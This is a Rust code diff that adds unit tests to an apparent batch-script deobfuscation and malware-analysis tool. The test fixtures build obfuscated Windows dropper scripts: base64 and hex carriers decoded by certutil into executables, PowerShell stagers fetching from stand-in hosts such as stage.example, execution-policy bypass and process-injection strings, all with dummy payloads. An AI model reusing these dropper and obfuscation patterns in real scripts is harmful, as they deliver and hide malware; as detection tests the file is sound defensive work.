+            script.push_str("echo ");
+            script.push_str(std::str::from_utf8(chunk).unwrap());
+            script.push_str("\r\n");
+        }
+        script.push_str("echo -----END CERTIFICATE-----\r\n");
+        script.push_str("echo \r\n");
+        script.push_str(") >>%cd%\\doc.pdf_.b64\r\n");
+        script.push_str("certutil -decode %cd%\\doc.pdf_.b64 \"%cd%\\doc.pdf\"\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted grouped echo-redirect base64 carrier"),
+            "grouped echo certificate carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64[..128]),
+            "raw grouped echo certificate carrier leaked into deob output"
+        );
+        assert!(
+            report.deobfuscated.contains("certutil -decode"),
+            "decode command should remain:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn prefix_grouped_echo_redirect_base64_pe_carrier_is_summarized_and_recovered() {
+        use base64::Engine;
+
+        let mut pe = vec![0u8; 0x3000];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let mut script = String::from("@echo off\r\n> %tmp%\\x (\r\n");
+        for chunk in b64.as_bytes().chunks(76) {
+            script.push_str("echo ");
+            script.push_str(std::str::from_utf8(chunk).unwrap());
+            script.push_str("\r\n");
+        }
+        script.push_str(")\r\ncertutil -decode %tmp%\\x %tmp%\\x.exe\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted grouped echo-redirect base64 PE carrier"),
+            "prefix grouped echo base64 PE carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64[..128]),
+            "raw prefix grouped echo base64 carrier leaked into deob output"
+        );
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, blob)| label.contains("embedded-base64-pe") && blob == &pe),
+            "prefix grouped echo base64 PE carrier was not recovered: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn prefix_grouped_echo_multilayer_base64_certutil_chain_recovers_pe() {
+        use base64::Engine;
+
+        let mut pe = vec![0u8; 0x3000];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let inner = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let outer = base64::engine::general_purpose::STANDARD.encode(inner.as_bytes());
+        let mut script = String::from("@echo off\r\n> payload.b64 (\r\n");
+        for chunk in outer.as_bytes().chunks(76) {
+            script.push_str("echo ");
+            script.push_str(std::str::from_utf8(chunk).unwrap());
+            script.push_str("\r\n");
+        }
+        script.push_str(
+            ")\r\ncertutil -decode payload.b64 inner.b64\r\ncertutil -decode inner.b64 payload.exe\r\n",
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.recovered_pe.iter().any(|(_, blob)| blob == &pe),
+            "multi-layer grouped echo certutil chain did not recover PE: {:?}\n{}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>(),
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&outer[..128]),
+            "outer grouped echo base64 carrier leaked into deob output"
+        );
+    }
+
+    #[test]
+    fn raw_multiline_base64_pe_carrier_is_summarized_before_timeout() {
+        use base64::Engine;
+
+        let mut pe = vec![0u8; 1_200_000];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let mut script = String::from("findstr /V marker \"%0\" > payload.b64\r\n");
+        for chunk in b64.as_bytes().chunks(380) {
+            script.push_str(std::str::from_utf8(chunk).unwrap());
+            script.push_str("\r\n");
+        }
+        script.push_str("certutil -decode payload.b64 payload.dll\r\n");
+        let cfg = Config {
+            timeout_secs: 1,
+            ..Config::default()
+        };
+
+        let report = analyze(script.as_bytes(), &cfg);
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "raw multiline base64 PE carrier timed out: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted multiline base64 PE carrier"),
+            "raw multiline base64 PE carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64[..256]),
+            "raw multiline base64 PE leaked into deob output"
+        );
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, blob)| label.contains("embedded-base64-pe") && blob == &pe),
+            "raw multiline base64 PE was not recovered: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn echo_redirect_long_non_pe_base64_run_is_summarized_after_materialization() {
+        let b64 = "Q".repeat(24_000);
+        let mut script = String::from("@echo off\r\n");
+        for (idx, chunk) in b64.as_bytes().chunks(4000).enumerate() {
+            let op = if idx == 0 { ">" } else { ">>" };
+            script.push_str("echo ");
+            script.push_str(std::str::from_utf8(chunk).unwrap());
+            script.push_str(op);
+            script.push_str("%TEMP%\\stage.tmp\r\n");
+        }
+        script.push_str("powershell -ExecutionPolicy Bypass -File %TEMP%\\stage.ps1\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted echo-redirect base64 carrier"),
+            "echo base64 carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64[..256]),
+            "raw echo base64 carrier leaked into deob output"
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::EchoRedirect { .. })),
+            "echo redirect traits were lost: {:?}",
+            report.traits
+        );
+        let echo_redirect_count = report
+            .traits
+            .iter()
+            .filter(|t| matches!(t, Trait::EchoRedirect { .. }))
+            .count();
+        assert_eq!(
+            echo_redirect_count, 1,
+            "raw carrier chunks should collapse into one summary trait: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn single_long_echo_redirect_base64_carrier_is_summarized_after_materialization() {
+        use base64::Engine;
+
+        let payload = vec![0x41; 1350];
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload);
+        let script = format!(
+            "@echo off\r\necho {b64} > %TEMP%\\stage.b64\r\ncertutil -decode %TEMP%\\stage.b64 %TEMP%\\stage.bin\r\n"
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted echo-redirect base64 carrier"),
+            "single-line echo base64 carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64[..256]),
+            "raw single-line echo base64 carrier leaked into deob output"
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::EchoRedirect { .. })),
+            "echo redirect summary trait was not emitted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn large_non_pe_echo_redirect_base64_run_is_summarized_before_timeout() {
+        let b64 = "Q".repeat(512_000);
+        let mut script = String::from("@echo off\r\n");
+        for (idx, chunk) in b64.as_bytes().chunks(4000).enumerate() {
+            let op = if idx == 0 { ">" } else { ">>" };
+            script.push_str("echo ");
+            script.push_str(std::str::from_utf8(chunk).unwrap());
+            script.push_str(op);
+            script.push_str("%TEMP%\\stage.tmp\r\n");
+        }
+        script.push_str("powershell -ExecutionPolicy Bypass -File %TEMP%\\stage.ps1\r\n");
+
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 2,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "echo base64 carrier should be summarized before timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted echo-redirect base64 carrier"),
+            "echo base64 carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64[..256]),
+            "raw echo base64 carrier leaked into deob output"
+        );
+    }
+
+    #[test]
+    fn echo_redirect_base64_powershell_payload_is_extracted_before_interpretation() {
+        use base64::Engine;
+
+        let ps1 = format!(
+            "$u='https://stage.example/payload.bin'; Invoke-WebRequest -Uri $u -OutFile $env:TEMP\\p.bin\r\n{}",
+            "Start-Sleep -Milliseconds 1\r\n".repeat(220)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&ps1);
+        let mut script = String::from(
+            "@echo off\r\nset carrier=%TEMP%\\stage.tmp\r\nset stage=%TEMP%\\stage.ps1\r\n",
+        );
+        for (idx, chunk) in b64.as_bytes().chunks(40).enumerate() {
+            let op = if idx == 0 { ">" } else { ">>" };
+            script.push_str("echo ");
+            script.push_str(std::str::from_utf8(chunk).expect("base64 ascii"));
+            script.push_str(op);
+            script.push_str("%carrier%\r\n");
+        }
+        script.push_str(
+            "powershell -NoProfile -c \"$d=Get-Content '%carrier%' -Raw;$d=$d-replace'`r',''-replace'`n','';[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($d))|Out-File '%stage%' -Encoding UTF8\"\r\n",
+        );
+        script.push_str("powershell -ExecutionPolicy Bypass -File %stage%\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted echo-redirect base64 PowerShell payload"),
+            "echo base64 PowerShell payload was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64[..80]),
+            "raw echo base64 PowerShell payload leaked into deob output"
+        );
+        assert!(
+            report
+                .extracted_ps1
+                .iter()
+                .any(|payload| payload == ps1.as_bytes()),
+            "decoded PowerShell payload was not extracted: {:?}",
+            report
+                .extracted_ps1
+                .iter()
+                .map(|payload| String::from_utf8_lossy(payload).into_owned())
+                .collect::<Vec<_>>()
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. } if src == "https://stage.example/payload.bin")
+            }),
+            "URL from decoded PowerShell payload was not rescued: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn huge_echo_redirect_base64_powershell_payload_is_not_queued_whole() {
+        use base64::Engine;
+
+        let ps1 = format!(
+            "Start-Sleep -Seconds 9; [Kernel32]::WriteProcessMemory($proc, $addr, $payload, $payload.Length, [IntPtr]::Zero); $u='https://stage.example/payload.bin'; $blob='{}'; FromBase64String\r\n",
+            "A".repeat(300 * 1024)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&ps1);
+        let mut script = String::from(
+            "@echo off\r\nset carrier=%TEMP%\\stage.tmp\r\nset stage=%TEMP%\\stage.ps1\r\n",
+        );
+        for (idx, chunk) in b64.as_bytes().chunks(4000).enumerate() {
+            let op = if idx == 0 { ">" } else { ">>" };
+            script.push_str("echo ");
+            script.push_str(std::str::from_utf8(chunk).expect("base64 ascii"));
+            script.push_str(op);
+            script.push_str("%carrier%\r\n");
+        }
+        script.push_str(
+            "powershell -NoProfile -c \"$d=Get-Content '%carrier%' -Raw;$d=$d-replace'`r',''-replace'`n','';[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($d))|Out-File '%stage%' -Encoding UTF8\"\r\n",
+        );
+        script.push_str("powershell -ExecutionPolicy Bypass -File %stage%\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted echo-redirect base64 PowerShell payload"),
+            "echo base64 PowerShell payload was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .extracted_ps1
+                .iter()
+                .all(|payload| payload.len() < 300 * 1024),
+            "huge decoded carrier should not be queued whole: {:?}",
+            report
+                .extracted_ps1
+                .iter()
+                .map(Vec::len)
+                .collect::<Vec<_>>()
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. } if src == "https://stage.example/payload.bin")
+            }),
+            "URL from decoded PowerShell payload was not rescued: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::ProcessInjection { api } if api == "WriteProcessMemory")
+            }) && report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::BeaconSleep { seconds } if *seconds == 9)),
+            "large decoded PowerShell payload was not fast-scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn summarized_large_echo_redirect_powershell_payload_is_fast_scanned() {
+        use base64::Engine;
+
+        let ps1 = format!(
+            "Start-Sleep -Seconds 9; [Kernel32]::WriteProcessMemory($proc, $addr, $payload, $payload.Length, [IntPtr]::Zero); $blob='{}'; FromBase64String\r\n",
+            "A".repeat(900 * 1024)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&ps1);
+        let mut script = String::from("@echo off\r\n");
+        for (idx, chunk) in b64.as_bytes().chunks(4000).enumerate() {
+            let op = if idx == 0 { ">" } else { ">>" };
+            script.push_str("echo ");
+            script.push_str(std::str::from_utf8(chunk).expect("base64 ascii"));
+            script.push_str(op);
+            script.push_str("\"%TEMP%\\stage.tmp\"\r\n");
+        }
+        script.push_str(
+            "powershell -NoProfile -c \"$d=Get-Content '%TEMP%\\stage.tmp' -Raw;$d=$d-replace'`r',''-replace'`n','';[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($d))|Out-File '%TEMP%\\stage.ps1' -Encoding UTF8\"\r\n",
+        );
+        script.push_str("powershell -ExecutionPolicy Bypass -File %TEMP%\\stage.ps1\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted echo-redirect base64 PowerShell payload"),
+            "large direct-target carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .extracted_ps1
+                .iter()
+                .all(|payload| payload.len() < 900 * 1024),
+            "large direct-target carrier should not be emitted whole: {:?}",
+            report
+                .extracted_ps1
+                .iter()
+                .map(Vec::len)
+                .collect::<Vec<_>>()
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::ProcessInjection { api } if api == "WriteProcessMemory")
+            }) && report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::BeaconSleep { seconds } if *seconds == 9)),
+            "summarized large PowerShell carrier lost high-signal traits: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn dense_percent_substring_carrier_with_missing_vars_is_summarized_before_timeout() {
+        let mut script = String::from("@echo off\r\nset \"d=ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\r\n");
+        for _ in 0..9000 {
+            script.push_str("%d:~25,1%%missing:~0,1%");
+        }
+        script.push_str("\r\n");
+
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 2,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "dense percent-substring carrier should not hit timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("dense percent-substring carrier line"),
+            "dense percent-substring carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("ZZZZZZZZZZZZZZZZ"),
+            "expanded carrier leaked into deob output"
+        );
+    }
+
+    #[test]
+    fn resolvable_dense_percent_substring_setlocal_keeps_delayed_payload_live() {
+        let seed = "setlocal EnableDelayedExpansion";
+        let mut setlocal = String::new();
+        for idx in 0..seed.len() {
+            setlocal.push_str(&format!("%seed:~{idx},1%"));
+        }
+        for _ in 0..80 {
+            setlocal.push_str("%pad:~0,0%");
+        }
+
+        let script = format!(
+            "@echo off\r\n\
+             set \"seed={seed}\"\r\n\
+             set \"pad=x\"\r\n\
+             set \"names=PSURL\"\r\n\
+             {setlocal}\r\n\
+             set \"PS=powershell -Command\"\r\n\
+             set \"URL=https://dense-delay.example/p.ps1\"\r\n\
+             !%names:~0,1%%names:~1,1%! \"iwr !%names:~2,1%%names:~3,1%%names:~4,1%!\"\r\n"
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("\r\nsetlocal EnableDelayedExpansion\r\n"),
+            "resolvable setlocal carrier should not be summarized away:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains(r#"powershell -Command "iwr https://dense-delay.example/p.ps1""#),
+            "delayed expansion payload did not materialize:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn bare_base64_carrier_line_is_summarized_before_timeout() {
+        let payload = format!(
+            "{}\\{}",
+            "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=".repeat(160_000),
+            "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=".repeat(160_000)
+        );
+        let script = format!("@echo off\r\necho loader\r\n{payload}\r\n");
+
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 2,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "bare base64 carrier should not burn the timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted long opaque base64 carrier line"),
+            "bare base64 carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("QUJDREVGR0hJSktM"),
+            "raw base64 carrier leaked into deob output"
+        );
+    }
+
+    #[test]
+    fn at_prefixed_residual_base64_carrier_line_is_summarized() {
+        let payload = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=".repeat(160);
+        let script = format!("@echo off\r\n@ {payload}\r\necho after\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted residual opaque base64 carrier line"),
+            "residual opaque base64 carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("QUJDREVGR0hJSktM"),
+            "raw residual base64 leaked into deob output"
+        );
+        assert!(
+            report.deobfuscated.contains("echo after"),
+            "following command was dropped:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn unresolved_percent_substring_carrier_is_summarized_before_drive() {
+        let mut script = String::from("@echo off\r\n");
+        for _ in 0..90_000 {
+            script.push_str("%饿色豆爱:~8,1%%艾尔贝艾:~9,1%");
+        }
+        script.push_str("\r\necho after\r\n");
+
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 2,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "unresolved percent-substring carrier should not burn the timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted long unresolved percent-noise line"),
+            "unresolved percent-substring carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("echo after"),
+            "following command was not preserved:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn echo_redirect_hex_decodehex_carrier_is_summarized_without_losing_recovery() {
+        let mut pe = b"MZ\x90\x00".to_vec();
+        pe.resize(8192, 0);
+        pe[0x3c] = 0x80;
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let hex = hex::encode(&pe);
+        let mut script = String::from("@echo off\r\n(\r\n");
+        for chunk in hex.as_bytes().chunks(96) {
+            script.push_str("echo ");
+            script.push_str(std::str::from_utf8(chunk).expect("hex ascii"));
+            script.push_str("\r\n");
+        }
+        script.push_str(") > \"29.t\"\r\ncertutil -decodehex \"29.t\" \"0.scr\" >nul\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            !report
+                .deobfuscated
+                .contains("omitted grouped echo-redirect base64 carrier"),
+            "hex decodehex input was incorrectly summarized as base64:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted grouped echo-redirect hex PE carrier"),
+            "hex decodehex input was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&hex[..256]),
+            "raw hex carrier leaked into deob output"
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::CertutilDecode { src, dst, src_resolved }
+                        if src == "29.t" && dst == "0.scr" && *src_resolved
+                )
+            }),
+            "certutil decodehex source did not resolve: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, blob)| label.contains("certutil") && blob == &pe),
+            "certutil decoded hex PE was not recovered: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn quoted_prefix_grouped_echo_redirect_non_pe_base64_carrier_is_summarized() {
+        use base64::Engine;
+
+        let payload = b"plain staged certutil payload without an mz header\n".repeat(180);
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload);
+        let mut script = String::from("@echo off\r\n> \"embedded.b64\" (\r\n");
+        for chunk in b64.as_bytes().chunks(76) {
+            script.push_str("echo ");
+            script.push_str(std::str::from_utf8(chunk).expect("base64 ascii"));
+            script.push_str("\r\n");
+        }
+        script.push_str(")\r\ncertutil -decode \"embedded.b64\" \"embedded.bin\"\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted grouped echo-redirect base64 carrier"),
+            "quoted prefix grouped non-PE carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64[..128]),
+            "raw quoted prefix grouped base64 carrier leaked into deob output"
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "embedded.b64" && dst == "embedded.bin" && !*src_resolved
+            )),
+            "certutil decode source should be present but unresolved after summarization: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn caret_obfuscated_long_rem_carrier_is_summarized_before_interpretation() {
+        let payload = "AbC123+/".repeat(2048);
+        let script = format!("@echo off\r\nr^E^m {payload}\r\necho done\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted 16384 bytes from long REM comment line"),
+            "caret-obfuscated REM carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&payload[..512]),
+            "raw caret-obfuscated REM payload leaked into deob output"
         );
     }
 
@@ -11458,7 +27171,7 @@ mod line_cap_tests {
         assert!(
             report
                 .deobfuscated
-                .contains("batdeob: omitted multiline base64 PE carrier"),
+                .contains("omitted multiline base64 PE carrier"),
             "PEM-wrapped PE carrier was not summarized:\n{}",
             report.deobfuscated
         );
@@ -11730,6 +27443,128 @@ mod fe_dosfuscation_tests {
             r.deobfuscated
         );
     }
+
+    #[test]
+    fn auto_delayed_expansion_ignores_powershell_bang_literals_without_set_defs() {
+        let script = br#"powershell.exe -windowstyle hidden "do {$x+=1} until (!$gerlin[$ashrames]);$s='!!L!!!O!!!b!!!A!!'"#;
+        let r = analyze(script, &Config::default());
+        assert!(
+            r.deobfuscated.contains("until (!$gerlin[$ashrames])"),
+            "PowerShell bang negation was treated as delayed expansion:\n{}",
+            r.deobfuscated
+        );
+        assert!(
+            r.deobfuscated.contains("!!L!!!O!!!b!!!A!!"),
+            "PowerShell bang string literal was treated as delayed expansion:\n{}",
+            r.deobfuscated
+        );
+    }
+
+    #[test]
+    fn auto_delayed_expansion_still_expands_assigned_plain_bang_ref() {
+        let script = b"set X=hi\r\necho !X!\r\n";
+        let r = analyze(script, &Config::default());
+        assert!(
+            r.deobfuscated.contains("echo hi"),
+            "assigned !X! should still trigger auto delayed expansion:\n{}",
+            r.deobfuscated
+        );
+    }
+
+    #[test]
+    fn auto_delayed_expansion_expands_percent_noisy_assigned_bang_ref() {
+        let script = b"set LONGNAME=set\r\n!LO%NOISE%NGNAME! PAYLOAD=ok\r\necho %PAYLOAD%\r\n";
+        let r = analyze(script, &Config::default());
+        assert!(
+            !r.deobfuscated.contains("!LO%NOISE%NGNAME!"),
+            "percent-noisy assigned !var! should not remain literal:\n{}",
+            r.deobfuscated
+        );
+        assert!(
+            r.deobfuscated.contains("echo ok"),
+            "command emitted by percent-noisy delayed alias did not run:\n{}",
+            r.deobfuscated
+        );
+    }
+
+    #[test]
+    fn auto_delayed_expansion_handles_percent_noisy_bang_refs_when_set_is_obfuscated() {
+        let long_noise = "N".repeat(600);
+        let script = format!(
+            r#"set S=s
+set E=e
+set T=t
+%S%%E%%T% VERYLONGCOMMANDALIAS=set
+echo powershell marker ! stray
+!VERYLONG%{n}A%COMMANDALIAS! A=1
+!VERYLONG%{n}B%COMMANDALIAS! B=2
+!VERYLONG%{n}C%COMMANDALIAS! C=3
+!VERYLONG%{n}D%COMMANDALIAS! D=4
+!VERYLONG%{n}E%COMMANDALIAS! E2=5
+!VERYLONG%{n}F%COMMANDALIAS! F=6
+!VERYLONG%{n}G%COMMANDALIAS! G=7
+!VERYLONG%{n}H%COMMANDALIAS! H=8
+echo %H%
+"#,
+            n = long_noise
+        );
+        let r = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            !r.deobfuscated.contains("!VERYLONG%"),
+            "percent-noisy bang command refs stayed literal:\n{}",
+            r.deobfuscated
+        );
+        assert!(
+            r.deobfuscated.contains("echo 8"),
+            "obfuscated set command did not execute via delayed expansion:\n{}",
+            r.deobfuscated
+        );
+    }
+
+    #[test]
+    fn auto_delayed_expansion_strips_many_long_batch_bang_markers() {
+        let marker = "!ThisIsAVeryLongUndefinedMarkerName!";
+        let script = format!(
+            "{m}e{m}c{m}h{m}o marker-free\r\n{m}r{m}e{m}m{m} done\r\n",
+            m = marker
+        );
+        let r = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            r.deobfuscated.contains("echo marker-free"),
+            "long bang marker noise did not collapse around command:\n{}",
+            r.deobfuscated
+        );
+    }
+
+    #[test]
+    fn auto_delayed_expansion_strips_many_long_percent_noisy_bang_markers() {
+        let marker = "!ThisIsAVery%NOISE%LongUndefinedMarkerName!";
+        let script = format!(
+            "{m}e{m}c{m}h{m}o marker-free\r\n{m}r{m}e{m}m{m} done\r\n",
+            m = marker
+        );
+        let r = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            r.deobfuscated.contains("echo marker-free"),
+            "long percent-noisy bang marker noise did not collapse around command:\n{}",
+            r.deobfuscated
+        );
+    }
+
+    #[test]
+    fn auto_delayed_expansion_strips_long_bang_markers_despite_opaque_pwsh_text() {
+        let marker = "!ThisIsAVeryLongUndefinedMarkerName!";
+        let script = format!(
+            "rem opaque payload bytes mention pwsh but do not invoke it\r\n{m}e{m}c{m}h{m}o marker-free\r\n{m}r{m}e{m}m{m} done\r\n",
+            m = marker
+        );
+        let r = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            r.deobfuscated.contains("echo marker-free"),
+            "opaque pwsh text blocked long bang marker cleanup:\n{}",
+            r.deobfuscated
+        );
+    }
 }
 
 fn is_label_or_comment_line(line: &str) -> bool {
@@ -11855,6 +27690,7 @@ mod set_a_unresolved_var_tests {
 
 #[cfg(test)]
 mod setlocal_tests {
+    use crate::traits::Trait;
     use crate::{analyze, Config};
 
     #[test]
@@ -11865,6 +27701,23 @@ mod setlocal_tests {
         assert!(
             report.deobfuscated.contains("echo value"),
             "got:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn delayed_expansion_triple_bang_builds_command_name() {
+        let cfg = Config::default();
+        let script = b"set A=s\r\nsetlocal EnableDelayedExpansion\r\nset \"cmd=!!!A!!!et\"\r\n!cmd! \"X=value\"\r\necho %X%\r\n";
+        let report = analyze(script, &cfg);
+        assert!(
+            !report.deobfuscated.contains("!!et"),
+            "triple-bang command prefix leaked into output:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("echo value"),
+            "set value did not feed later percent expansion:\n{}",
             report.deobfuscated
         );
     }
@@ -11887,12 +27740,61 @@ mod setlocal_tests {
             report.deobfuscated
         );
     }
+
+    #[test]
+    fn excessive_setlocal_nesting_is_capped() {
+        let mut script = String::new();
+        for _ in 0..1100 {
+            script.push_str("setlocal\r\n");
+        }
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DepthCapped { command } if command == "setlocal"
+            )),
+            "expected setlocal cap trait: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
 mod limits_tests {
     use crate::traits::Trait;
     use crate::{analyze, Config};
+
+    #[test]
+    fn duplicate_extracted_child_content_is_analyzed_once_across_paths() {
+        let mut env = crate::env::Environment::new(&Config {
+            max_child_scripts: 8,
+            ..Config::default()
+        });
+        let child = b"@echo off\r\nset /a CHILD=1\r\necho duplicate child\r\n".to_vec();
+        env.modified_filesystem.insert(
+            "a.bat".to_string(),
+            crate::env::FsEntry::Content {
+                content: child.clone(),
+                append: false,
+            },
+        );
